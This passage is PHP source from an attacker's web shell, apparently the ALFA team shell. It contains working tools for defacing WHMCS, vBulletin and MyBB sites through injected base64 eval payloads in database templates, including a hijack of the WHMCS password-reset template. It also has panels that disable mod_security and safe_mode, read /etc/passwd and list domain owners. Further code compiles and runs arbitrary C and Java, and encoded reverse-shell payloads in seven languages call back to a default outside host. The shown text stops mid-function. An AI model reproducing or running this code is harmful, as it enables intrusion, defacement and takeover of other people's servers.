echo '<div class=header><center><p><div class="txtfont_header">| Index Changer |</div></p><h3><a href=javascript:void(0) onclick="g(\'IndexChanger\',null,null,null,\'whmcs\')">| Whmcs | </a><a href=javascript:void(0) onclick="g(\'IndexChanger\',null,\'vb\',null)">| vBulletin | </a><a href=javascript:void(0) onclick="g(\'IndexChanger\',null,null,\'mybb\')">| MyBB | </a></h3></center>';
if(isset($_POST['alfa3'])&&($_POST['alfa3'] == 'whmcs')){
echo __pre();

echo "<center><center><div class='txtfont_header'>| Whmcs |</div>
<p><center>".getConfigHtml('whmcs')."<form onSubmit=\"g('IndexChanger',null,null,null,'whmcs',this.fname.value,this.path.value,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.index.value); return false;\">
";
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'URL', 'inputName' => 'path', 'inputValue' => 'http://site.com/whmcs', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'File Name', 'inputName' => 'fname', 'inputValue' => '', 'inputSize' => '50'),'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'inputName' => 'dbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'inputName' => 'dbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50')
);
create_table($table);
echo "<br><div class='txtfont'>| Your Index |</div><br>
<textarea name=index rows='19' cols='103'><title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
$s0levisible="Powered By Solevisible";
$dbu = $_POST['alfa6'];
$path = $_POST['alfa5'];
$fname = $_POST['alfa4'];
$dbn = $_POST['alfa7'];
$dbp = $_POST['alfa8'];
$dbh = $_POST['alfa9'];
$index = $_POST['alfa10'];
$index = str_replace("\'","'",$index);
$deface = '$x = base64_decode("'.__ZW5jb2Rlcg($index).'"); $solevisible = fopen("'.$fname.'","w"); fwrite($solevisible,$x);';
$saveData = __ZW5jb2Rlcg($deface);
$Def = '{php}eval(base64_decode("'.$saveData.'"));{/php}';
if(!empty($dbh)&&!empty($dbu)&&!empty($dbn)&&!empty($index)){
$conn=@mysqli_connect($dbh,$dbu,$dbp,$dbn) or die(mysqli_error($conn));
$soleSave=@mysqli_query($conn,"select message from tblemailtemplates where name='Password Reset Validation'");
$soleGet = mysqli_fetch_assoc($soleSave);
$tempSave1 = $soleGet['message'];
$tempSave = str_replace("'","\'",$tempSave1);
$inject = "UPDATE tblemailtemplates SET message='$Def' WHERE name='Password Reset Validation'";
$result=@mysqli_query($conn,$inject) or die (mysqli_error($conn));
$create = "insert into tblclients (email) values('solevisible@fbi.gov')";
$result2 =@mysqli_query($conn,$create) or die (mysqli_error($conn));
if(function_exists('curl_version')){
$AlfaSole = new AlfaCURL(true);
$saveurl = $AlfaSole->Send($path."/pwreset.php");
$getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=solevisible@fbi.gov");
$backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
$Solevisible = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
__alert('File Created...');
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color=red><a target='_blank' href='".$path."/".$fname."'>Click Here !</a></font></b></center><br><br>";
}else{
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target </font><font color=red>\" ".$path."/pwreset.php \"</font><br/><font color=\"#FFFFFF\"> and reset password with email</font> => <font color=red>solevisible@fbi.gov</font><br/><font color=\"#FFFFFF\">and go to</font> <font color=red>\" ".$path."/".$fname." \"</font></b></center><br><br>";
}}}}
if(isset($_POST['alfa1']) && ($_POST['alfa1'] == 'vb')){
echo __pre();

echo "<center><center><div class='txtfont_header'>| vBulletin |</div>
<p><center>".getConfigHtml('vb')."<form onSubmit=\"g('IndexChanger',null,'vb',this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.index.value,this.prefix.value,'>>'); return false;\">
";
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' =>'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'inputName' => 'dbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'inputName' => 'dbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Prefix', 'inputName' => 'prefix', 'id' => 'db_prefix', 'inputValue' => '', 'inputSize' => '50')
);
create_table($table);
echo "<br><div class='txtfont'>| Your Index |</div><br>
<textarea name='index' rows='19' cols='103'><title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><br>
<input type='submit' value=' '></form></center></center>";
if($_POST['alfa8']=='>>'){
$s0levisible="Powered By Solevisible";
$dbu = $_POST['alfa2'];
$dbn = $_POST['alfa3'];
$dbp = $_POST['alfa4'];
$dbh = $_POST['alfa5'];
$index = $_POST['alfa6'];
$prefix = $_POST['alfa7'];
$index=str_replace("\'","'",$index);
$set_index = "{\${eval(base64_decode(\'";
$set_index .= __ZW5jb2Rlcg("echo \"$index\";");
$set_index .= "\'))}}{\${exit()}}";
if(!empty($dbh)&&!empty($dbu)&&!empty($dbn)&&!empty($index)){
$conn=@mysqli_connect($dbh,$dbu,$dbp,$dbn) or die(mysqli_error($conn));
$loli1 = "UPDATE ".$prefix."template SET template='".$set_index."".$s0levisible."' WHERE title='spacer_open'";
$loli2 = "UPDATE ".$prefix."template SET template='".$set_index."".$s0levisible."' WHERE title='FORUMHOME'";
$loli3 = "UPDATE ".$prefix."style SET css='".$set_index."".$s0levisible."', stylevars='', csscolors='', editorstyles=''";
@mysqli_query($conn,$loli1) or die (mysqli_error($conn));
@mysqli_query($conn,$loli2) or die (mysqli_error($conn));
@mysqli_query($conn,$loli3) or die (mysqli_error($conn));
__alert('VB index changed...!');
}
}
}
if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'mybb')) {
echo __pre();

echo "<center><center><div class='txtfont_header'>| Mybb |</div>
<p><center>".getConfigHtml('mybb')."<form onSubmit=\"g('IndexChanger',null,'null','mybb',null,null,null,this.mybbdbh.value,this.mybbdbu.value,this.mybbdbn.value,this.mybbdbp.value,this.mybbindex.value); return false;\" method=POST action=''>
";
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' => 'mybbdbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'inputName' => 'mybbdbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'inputName' => 'mybbdbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'inputName' => 'mybbdbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50')
);
create_table($table);
echo "<br><div class='txtfont'>| Your Index |</div><br>
<textarea name=mybbindex rows='19' cols='103'>
<title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
$mybb_dbh = $_POST['alfa6'];
$mybb_dbu = $_POST['alfa7'];
$mybb_dbn = $_POST['alfa8'];
$mybb_dbp = $_POST['alfa9'];
$mybb_index = $_POST['alfa10'];
if(!empty($mybb_dbh)&&!empty($mybb_dbu)&&!empty($mybb_dbn)&&!empty($mybb_index)){
$conn=@mysqli_connect($mybb_dbh,$mybb_dbu,$mybb_dbp,$mybb_dbn) or die(mysqli_error($conn));
$prefix="mybb_";
$loli7 = "UPDATE ".$prefix."templates SET template='".$mybb_index."' WHERE title='index'";
$result =@mysqli_query($conn,$loli7) or die (mysqli_error($conn));
__alert('MyBB index changed...!');
}
}
}
echo "</div>";
alfafooter();
}
function alfaproc()
{
alfahead();
echo "<Div class=header><br><center>";
if(empty($_POST['ajax'])&&!empty($_POST['alfa1']))
$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
if($GLOBALS['sys']=="win"){
$process=array(
"Task List" =>"tasklist /V",
"System Info" =>"systeminfo",
"Active Connections" => "netstat -an",
"Running Services" => "net start",
"User Accounts" => "net user",
"Show Computers" => "net view",
"ARP Table" => "arp -a",
"IP Configuration" => "ipconfig /all"
);}else{
$process=array(
"Process status" => "ps aux",
"Syslog" =>"cat /etc/syslog.conf",
"Resolv" => "cat /etc/resolv.conf",
"Hosts" =>"cat /etc/hosts",
"Cpuinfo"=>"cat /proc/cpuinfo",
"Version"=>"cat /proc/version",
"Sbin"=>"ls -al /usr/sbin",
"Interrupts"=>"cat /proc/interrupts",
"lsattr"=>"lsattr -va",
"Uptime"=>"uptime",
"Fstab" =>"cat /etc/fstab"
);}
foreach($process as $n => $link){
echo '<a href="javascript:void(0);" onclick="g(\'proc\',null,\''.$link.'\')"> | '.$n.' | </a>';
}
echo "</center><br>";
if(!empty($_POST['alfa1'])){
echo "<pre class='ml1' style='margin-top:5px' >";
if($GLOBALS["glob_chdir_false"]&&!empty($_POST["c"])){$cmd = "cd '".addslashes($_POST["c"])."';";}
echo alfaEx($cmd.$_POST['alfa1'], true);
echo '</pre>';
}
echo "</div>";
alfafooter();
}
function alfasafe(){
alfahead();
echo "<div class=header><center><br><div class='txtfont_header'>| Auto ByPasser |</div>";
echo '<h3><a href=javascript:void(0) onclick="g(\'safe\',null,\'php.ini\',null)">| PHP.INI | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,\'ini\')">| .htaccess(apache) | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,\'pl\')">| .htaccess(LiteSpeed) |</a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,null,\'passwd\')">| Read-Passwd | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,null,null,\'users\')">| Read-Users | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,null,null,null,\'valiases\')">| Get-User | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,null,null,null,null,null,\'domains\')">| Get-Domains | </a></center></h3>';
if(!empty($_POST['alfa8']) && isset($_POST['alfa8']) == 'domains'){
if(!_alfa_file_exists("/etc/virtual/domainowners")){
echo __pre();
$solevisible9 = _alfa_file('/etc/named.conf');
if(is_array($solevisible9)){
foreach($solevisible9 as $solevisible13){
if(@eregi('zone',$solevisible13)){
preg_match_all('#zone "(.*)"#',$solevisible13,$solevisible14);
if(strlen(trim($solevisible14[1][0])) > 2){
echo $solevisible14[1][0].'<br>';
}}}
}
}else{
echo __pre();
$users = _alfa_file("/etc/virtual/domainowners");
if(is_array($users)){
foreach($users as $boz){
$dom = explode(":",$boz);
echo $dom[0]."\n";}}}}
if(!empty($_POST['alfa6']) && isset($_POST['alfa6']) == 'valiases'){
echo '
<form onsubmit="g(\'safe\',null,null,null,null,null,null,\'valiases\',this.site.value,null,\'>>\'); return false;" method="post" /><center><div class="txtfont">Url: </font><input type="text" placeholder="site.com" name="site" /> <input type="submit" value=" " name="go" /></form></center>';
if(isset($_POST['alfa9']) && $_POST['alfa9'] == '>>'){
if(!_alfa_file_exists("/etc/virtual/domainowners")){
$site = trim($_POST['alfa7']);
$rep = str_replace(array("https://","http://","www."),"",$site);
$user = "";
if(function_exists("posix_getpwuid") && function_exists("fileowner")){
	if($user = @posix_getpwuid(@fileowner("/etc/valiases/{$rep}"))){
		$user = $user['name'];
	}
}else{
	if(_alfa_can_runCommand(true,true)){
		$user = alfaEx("stat -c '%U' /etc/valiases/".$rep);
	}
}
if(!empty($user)&&$user!='root'){
echo __pre()."<center><table border='1'><tr><td><b><font color=\"#FFFFFF\">User: </b></font></td><td><b><font color=\"#FF0000\">{$user}</font></b></td></tr><tr><td><b><font color=\"#FFFFFF\">site: </b></font></td><td><b><font color=\"#FF0000\">{$rep}</font></b></td></tr></table></center>";
}else {echo __pre().'<center><b>No such file or directory Or Disable Functions is not NONE...</b></center>';}
}else{
$site = trim($_POST['alfa7']);
$rep = str_replace(array("https://","http://","www."),"",$site);
$users = _alfa_file("/etc/virtual/domainowners");
foreach($users as $boz){
$ex = explode(":",$boz);
if($ex[0] == $rep){
echo __pre()."<center><table border='1'>
<tr><td><b><font color=\"#FFFFFF\">User: </b></font></td><td><b><font color=\"#FF0000\">".trim($ex[1])."</font></b></td></tr>
<tr><td><b><font color=\"#FFFFFF\">site: </b></font></td><td><b><font color=\"#FF0000\">{$rep}</font></b></td></tr></table></center>";break;}}}}}
if(!empty($_POST['alfa5']) && isset($_POST['alfa5'])){
if(!_alfa_file_exists("/etc/virtual/domainowners")){
echo __pre();
$i = 0;
while ($i < 60000) {
$line = @posix_getpwuid($i);
if (!empty($line)) {
while (list ($key, $vl) = each($line)){
echo $vl."\n";
break;}}$i++;}
}else{echo __pre();
$users = _alfa_file("/etc/virtual/domainowners");
foreach($users as $boz){
$user = explode(":",$boz);
echo trim($user[1]).'<br>';}}}
if(!empty($_POST['alfa4']) && isset($_POST['alfa4'])){
echo __pre();
if(_alfa_can_runCommand(true,true)){echo __read_file("/etc/passwd");}elseif(function_exists("posix_getpwuid")){
for($uid=0;$uid<60000;$uid++){
$ara = @posix_getpwuid($uid);
if(!empty($ara)){
while(list ($key, $val) = each($ara)){
echo "$val:";
}echo "\n";}}
}else{__alert('failed...');}}
if(!empty($_POST['alfa2']) && isset($_POST['alfa2'])){
@__write_file($GLOBALS['cwd'].".htaccess","#Generated By Sole Sad and Invisible\n<IfModule mod_security.c>\nSec------Engine Off\nSec------ScanPOST Off\n</IfModule>");
echo '<center><b><big>htaccess for Apache created...!</center></b></big>';
}
if(!empty($_POST['alfa1'])&& isset($_POST['alfa1'])){
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Sole Sad & Invisible(ALFA TEaM)");
echo '<center><b><big> php.ini created...!</center></b></big>';
}
if(!empty($_POST['alfa3']) && isset($_POST['alfa3'])){
@__write_file($GLOBALS['cwd'].".htaccess","#Generated By Sole Sad and Invisible\n<Files *.php>\nForceType application/x-httpd-php4\n</Files>\n<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
echo '<center><b><big>htaccess for Litespeed created...!</center></b></big>';
}
echo "<br></div>";
alfafooter();
}
function __get_resource($content){
return @gzinflate(__ZGVjb2Rlcg($content));
}
function __write_file($file, $content){
if($fh = @fopen($file, "wb")){
if(fwrite($fh, $content)!==false) return true;
}
return false;
}
function bcinit($evalType, $evalCode, $evalOptions, $evalArguments){
$res = "<font color='green'>[ Success...! ]</font>";
$err = "<font color='red'>[ Failed...! ]</font>";
if($evalOptions!="") $evalOptions = $evalOptions." ";
if($evalArguments!="") $evalArguments = " ".$evalArguments;
if($evalType=="c"){
$tmpdir = ALFA_TEMPDIR;
chdir($tmpdir);
if(is_writable($tmpdir)){
$uniq = substr(md5(time()),0,8);
$filename = $evalType.$uniq.".c";
$path = $filename;
if(__write_file($path, $evalCode)){
$ext = ($GLOBALS['sys']=='win')? ".exe":".out";
$pathres = $filename.$ext;
$evalOptions = "-o ".$pathres." ".$evalOptions;
$cmd = "gcc ".$evalOptions.$path;
alfaEx($cmd);
if(is_file($pathres)){
if(chmod($pathres, 0755)){
$cmd = $pathres.$evalArguments;
alfaEx($cmd);
}else{$res = $err;}
unlink($pathres);
}else{$res = $err;}
unlink($path);
}else{$res = $err;}
}
return $res;
}elseif($evalType=="java"){
$tmpdir = ALFA_TEMPDIR;
chdir($tmpdir);
if(is_writable($tmpdir)){
if(preg_match("/class\ ([^{]+){/i",$evalCode, $r)){
$classname = trim($r[1]);
$filename = $classname;
}else{
$uniq = substr(md5(time()),0,8);
$filename = $evalType.$uniq;
$evalCode = "class ".$filename." { ".$evalCode . " } ";
}
$path = $filename.".java";
if(__write_file($path, $evalCode)){
$cmd = "javac ".$evalOptions.$path;
alfaEx($cmd);
$pathres = $filename.".class";
if(is_file($pathres)){
if(chmod($pathres, 0755)){
$cmd = "java ".$filename.$evalArguments;
alfaEx($cmd);
}else{$res = $err;}
unlink($pathres);
}else{$res = $err;}
unlink($path);
}else{$res = $err;}
}
return $res;
}
return false;
}
function alfaconnect(){
alfahead();
$php="7VZta9swEP5e6H9QjaE2S5uXfhg0pDBYPw7KVtiHtjOOLNcitqVJ8pKxpb99d36L4zid17WwQV1wrbvTo0e6Oz1hSgnlKSaFMjy9d0bu9PBAM+MZnjAv5gk3hU3MPZ7ImFNuvDDOdOSg1Ta+umdGkxlhKxmLgDkWsQaktOchFL3js7O3OFj6MEizOMYBaw50BAMLUIAJub78+GG2Mkwl06tP49nxrX31+f3F8bR0g206nPN0CJNOuIXTE5z9QN7FoU+umZ8QHbE4Jg/k8AD9PCQOFVlqnIqyS2ZAyyU/Dg8IPLYEgNI3LU05I6saGRzBogFa1oTFmu1BnXSi6pvRXRO5No/vtpfw6SJfomAdZik1XKQeW3FttHMsaWpiLxRqcew2FuIBTN748vSgBzEK74yc4IYBxzjjtru0j5p2KTRfeVANmgeO2wFQUkTe1dlsGGHatVGQC08LuoCa0kx9Y8qxDJXnw+HoNP87t8gp0IeaYUqlovgP8yoiFURZkyKDw9YDclYztenOQj6lTGJcczcQYkQslsBAZ3MYOTKSXpb6CXPcARkBpptv0lrydLMPfMKl4oY5NgV2CdCFtNElHskpsS6sahF8lhGPGZ4oOQKk0Ici2UKqiyLE1ANic3J97orde4lvaORYQxrcEufmy62+e+MOOfYWnpVS7g5ujh1gGYB7U1VtdK69gCsHIgGCRtV3R7QtAGt7r62oTRsYxZPmEduyPEysFov8/En2RnzNIMIlc8jgooWP6AUNHxr7coWTkIi1k4TWxGbGRHNv60ZWaSw0a+WgMtalU2xxbzU059oB1ryvlP/dGZHZRflpSS4ZJM5SFtTZuMOxRMek27G1gFTY5EpQT0iWAstogKtiUXDZjMSUHEGmFdMiUxTYSqyY7d7Hp9Fe8xi6B0UAweCygp7oFTnuHTnpFUlbQWVPGZXt9lJ+QzIRYhaxyIrvgpXbXVO28uss5Tms9lBSbHdCzTFmFO4U5UPkEl8MXqheXS3MU6+xgvL3dCvHmwDggyKO6q42rOqtyorN21HrxwjU2+vDog5+nAp9EovJn7CY/D2Ljl7XXb3eeQEUp73PM97r2S6gvFcrb61p6+YPiEo9Ufa31TNEOSsaPSrvfZbia0v/nknb9LNr207uXrWtib9P2+AHa1910z3UrYeQ6VchexEh008SMv0kIdMvLmS65+Wt/ych0/+EkP2ORV8he2nN+gU=";
$python="pVRtT9swEP6cSv0PxptWR80M7YY0wYJUQZjQBlRtp30AVqXOpYmWOpHtQPnCb5/tJG1AHUKaqra+V99z95zf7e2XUuwvUr4P/B4VjyrJebeTropcKCTAk+WiEDkDKb1cevJRf3P2B5Sn0hV0O4WPcbeT2N8IYiQTyDLC3KNuxzFx/jaejvMCOGGe9fFnotTZVZSX6pnTxTgwahBilzrlL7WuvkmAKgVHRk2rlFRAGBG336h0upZqVSjiUuAsj4D0ShV//NLTeSoIIVNpzmsMaYxySXm4gj0fc4WNzol9RuM0A54Tc7ujPXRjFKwIhrVt3CyYXPprBWJ1PJ4O/N778a+zk95xbdWqY9tymaCPKfr6AfelEiR2+xidtIXhVjIXQSbBFvCQ6NuR6aAVHSUeq4MjdGkC2D0ZHAw/uzQCCxFbiNgW68CaQaFq/yKUstI2uR2DWWMjwj05qDXOwhdAJYSCJQSz6BaRm9+38q7vYk94cRYupXG4+HZ1PQlOR9PAreN0qkWTo+5lEaqEpjJKBVnQpcjLggxcd+NkmsmSF9bGqEcJPCL/mmDj18Ki8xl+WVYKt11JqVDII4tUnw3WOruRKkebB9XkOg+11HCkqeBoSz58y3FfF78ExR4Mz/CJ3omlr5lBQ7G810tV9XXp+v7Q7oe/vBncdTuQtSyf2hYn0YehddGVwDpVuhtm6VKuSKFP0q+2kVZ/pJZG5/OLq2BWryqdXp9+n09nk2B0aWI0TGUsebEJmF7/mBuvdsx8EvycBqOzs4lnLn1ZvaSawREh+IDaD/YKOwBJs1TvAieHRjLM1Csfur7uAjPEsyvT4qB5R6jMAAqLbTu8navXUIDgJzTK4hDNIFyhqZkvetIT2M2JLSFeC8ebp2F3ls3D8KwZdmAGJtLEzTkHpghJ6mbsxnn4Bpzy/3C+Fv5GnNL9Cw==";
$perl="lZLRjpNAFIav26TvMOJsC8kYWr1bpJFQ3DRrS8OwGmOVsPSsTKQDgVm3m+722Z0BVifGGL0755/Dd+Abnj+zb5vavmbcBv4dVVAXo+FtA2gZnp/TMvsGwhkNcdm4+EuoqiZ3DThUZS1QHEQr9yCg3jsbOnMnW7z5sNjOJ05/LkOnJTc5esEM+TS7MRXqtLfvZMysY4s788MV3QT+GbIvDedRLhHuVxBVXYry+p6nezAnIqsmliQ07SuZlIw3b5PlOojJmIb+ZULjKPBWBAvr4WHHwLS6bW+86OK9686s42g4wJWLVf9p+lmeDhoQilZWCkfDd4kCSSANkyi4ooG3WERkpkAD+RE7OaTG092uThg3cUWWazWSeOuPlrZ1ULBGAJfjr/Q0zTKQm3xCrW65JPrEOCGvuElRDOke0RyKAp223CDTdqisgCMaL5ZrYrwe+4bzFIRXMTHmehJEUZ/I5+AAGZJqtfVZUTZg+pbTFfRnoehaI8laJ6lWB2QCTWUlLweK5pfYl38Si/O+nXUtcxkHkaSilNpyXQpO3d+cYqafZyXnkKn7wamet/boP9gze3vzMTUs5ynp9elR709FfxP4f946W3BU+kz5Jz3+AA==";
$ruby="tVb7b9M6FP7Z+SuMN0hzVxLGQ+h2N6vGU0ggqjG4QmQXtc5pYy11gu3QoW387fiVrqXt1ivd66p1es7n8/T52p07SSNFMmI8Af4di2b0I9jBhVK17CXJhKmiGcW0miajR08fn7nPQMC3hgnAoazoGajwWlAPVcGHUwiDIIcxlg09kwESoBrB8fHHZ5+/Dt4enbx6f/wuzqsZp0MJ8XSoaNEJp3LG+KV5TxmfzMKor0QDvfGwlBAAz51FAcPSOOlIJSJtOdV7gNgYv2IlxHDOpJJ9r9TagY8n5jCz0rg1EKvqqw7NGDbHbaRYFcCxSEU8kc2ok2RJ0iVZRiJsYT4N4aLRh46OX3+KS+ATVaTpfoD1MqIvD07Tn8k/Xx7c//P0Yr/75Go36dfpG65gAqLjEVFPB6vsGZmePB98APEdhI2TkG4dWQ1NZTykFGoHpHEtGFeY2DZgWUBZ4h6mFedAFeQZJxY3ggnj9sksHSivlO8FXljjlJoqsCUhnAPF0voZdwic15VQ+OTl8bv0XIGYHgw+7Kdhtjv4+0V2GB54vRYe2DskC3yf4eyv7N7dHGeHdnvodtIdm1c09wamsYuu2/TmPSYxifbIIVlCzQrdaVzq2CeglhMySwyZBAxCVOKZqEzypWlGziAT/d1kBe+rU8a0qKZ1mhKyAvEwY4fmOP4jYWshZpVp6e+ORiasG4aRM7zxRHt1cz0/VFXiR79TRhvRzse8QLcgXzChvWvLNwHNZd6k264jCw31ZcpmvRvLtC5pV6etE7oN/p+mBRtNvXkf11UNvFN2iSDRxSWrLlvzrDJsk+8RPZd7K76ugm3D/l22+L19FiBpc33vNfnN6QW4bMR1BjKmZbWQkUw5K4PWluvhErE9tAS5gdi0o1VqO9DSIrXf9k81x5oC+oAc4TrGsz8ejvF2Loory3pIbsFxyBEcQkvUhhAaa760jIaMu/+byFCb2Tzo1QullS1hSUdYWoJuISkbP1rDTMjLF6nIytBm4kHtoTU0g9rDi4zihUvk4US2d3bdmLCty29MsDmKdpBX3S5r/o1z8Mh10ym3nM4lp353m/8zsHbgkJ82E6WbM/1kJwz58XKTZ8FG8gs=";
$node="nVHLasMwEDwrkH8QvliCoEDTW8ih9BPSW/pAtdeRQJZcSXYKIfn2yrKd5tGWYh+Ed2d2NDtquMWu4juNV9jCRy0tkDQTUuVvlTUZOJdSFgnL6aQJZA3+nBrKlPaQ8xZ4eY52nRMhM9oZBRdXda1I6VUEKBUo6fxd6rkTaUBkQXo3rFLcF8aWrOQ+E2T+ugssSen3XFbmDD4hPSlyu20CMCi0ZafZ/jEFeuvFarWg++kEtXwRyGEvlgXzHtZgG7CkqHXmpdHERR5ybGelB5Ic8YMqOH5qV19HD8dnnbT74P7rtgqiMUcSjZ7jTjDnc6mZBVeXQOg1ZGrPws1Jzj1PZoMTTNqa7gcnsVoebpXB2pHjf40Npm+mUXcKpqTzoGPKm7uXtnmYTkA5wNfZ35+ydxfZPxqtoYu9V5nF19wsotx/HgH9lj76IXY0Mm80Mmg0LuHDFw==";
$c="tVJtb9owEP7cSv0PHp1ap/WAsO0TTaWoZBLaChHJNE0bilLHNKcZG8Vmgk7rb98lBArZi/alUqzcPff47nzPnYLicpkJcmVsBrqdX58cn+5hBaj738BMwl0TXJuOXS+E+QNuNP8mbCOghAU8HVCNwFIBVqhAUJbMU1C0NNLinjOepwW5QPP7l6nz4+T4qIwYxpn23D662PCSI4IV0ywrElAEShxmtLzveb3q1hG0Dahkls5Brj3/XTIcBXH/KbDQhfVyq5WhqdVAq4Lu1HH2OGX+tql+FVXS4cgfDCaJP/q84Rlv83JaF2DR+OZ9EsWTwL9l3ZojbEnSC0sNxj8kJaeiJpPgYxSUGdmZZgYehJ5RvW1hRl8YR6zA0jrRHagMU9DGBMiFcwasu3JrmsThCoXEtxufeynnoqrefeoJU3HWeiS+nKUkFumcRLmQkjx+VS3We7MlZstFD4mHnnvg9eqUayw7py2xKkdL4mBy662sKOb9MHK985fhp8H1eb+OIoSm4KSDj+qYnLyCVt2t1EZQXjk/8QhpBNlp+/pZtC23tLI2zN60nveDKPQWYjh1iWPdMi7dy31kl/2fGzEMw8k4HifxTbgTmXKtlOD2r8rWe9GIOY5z1T1Yj0pT87+amobnHnjPoanZaorfLw==";
$java="lVRNb9swDD2nQP+D4JM9BG6T04bCwz6ww4ABHZbeuhwUhbG12rIg0XGCNPvtoz7sumsvPdiWyCfy8ZGybHRrkP3he57LNn93c3khJyYF6G2XF7rb1FIwUXNrGa93/A54c7q8mGkj9xyBWeRIgJ1UvI4wjQwOCGpr2V1lgG8dfjzwXekOV0j2hkl7M3Xddvjkazv0DMgdOGhMn5+dvziQnbCSNpe2oMh+ScbCRTqHUJ9u92CM3MIk7r6VW2Y6lWae5wzNMSxmmyPC/ZptWMEU9Mxv3y8+LNc3wS8VMkFOyuPKTDdZdPSVrCEVH4vrjMVYM2KR90YipJv59VwMUG/f1Z2t0tH0asyz/4S34Ciq9NtBgEbZKgbZCXJSUZEWXDzcGS6Awnmwe4XqY72xY77shkuVkn5SlVQoN6UNIrjK3Dj43MHPRLMlXsnVRqorWyXeJXfp6mgRmrwE/GlaDQaPadLaXPEGkizH9kfbg/nKLRHKpdrC4XaXJr1USebkOcWo9EkC35itd9a/7DONHHMzx1YV1DX7+1uFzJPe9C75F9rbKOGqFQ+ArIp9C9voG7tL1F29eQ2qxKooFrH9M38NCppThBJMrrmxQBuPvr9eD/1YgaFZiqnskGpiTF2gAe242JwL17Gh0aGXUFtg/5NZvpVMEE1qwnrXYj1JPBFB6jmb8Dq/LgV7fGSv85newFK6siun/sQ8jvGzy1m2I3ZqH8HkH27HYKJxEuB+J3TwV6dQNuCOxyVNExxApDQ4WfxPkFo0tYtYMOmsX1CbOyJDAodePqFL90fRLxmO8EVOV8e49unluHyS0b/ecDPpOf8D";
echo "<div class=header><center><br><div class='txtfont_header'>| Back Connect |</div><br><br>";
echo "<form onSubmit=\"g('connect',null,this.selectCb.value,this.server.value,this.port.value,this.cbmethod.value);return false;\">
<div class=\"txtfont\">Mehtod:</div> <select name='cbmethod' onChange='ctlbc(this);' style='width:120px;'><option value='back'>Reverse Shell</option><option value='bind'>Bind Port</option></select> <div class=\"txtfont\">Use:</div> <select name='selectCb'>";
$cbArr = array("php"=>"Php","perl"=>"Perl","python"=>"Python","ruby"=>"Ruby","c"=>"C","java"=>"Java","node"=>"NodeJs","bcwin"=>"Windows");
foreach($cbArr as $key=>$val){echo("<option value='{$key}' ".($GLOBALS['sys']=='win'?'selected':'').">{$val}</option>");}
echo "</select> <div id='bcipAction' style='display:inline-block;'><div class=\"txtfont\">Host:</div> <input type='text' style='text-align:center;' name='server' value='cvar1984.my.id'></div> <div class=\"txtfont\">Port: </div> <input type='text' size='5' style='text-align:center;' name='port' value='1234'> <input type='submit' value=' '></form><p><div id='bcStatus'><small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small></div></p></center></b></font><br>";
if(isset($_POST['alfa1'])&&!empty($_POST['alfa1'])){
$lang = $_POST['alfa1'];
$ip = $_POST['alfa2'];
$port = $_POST['alfa3'];
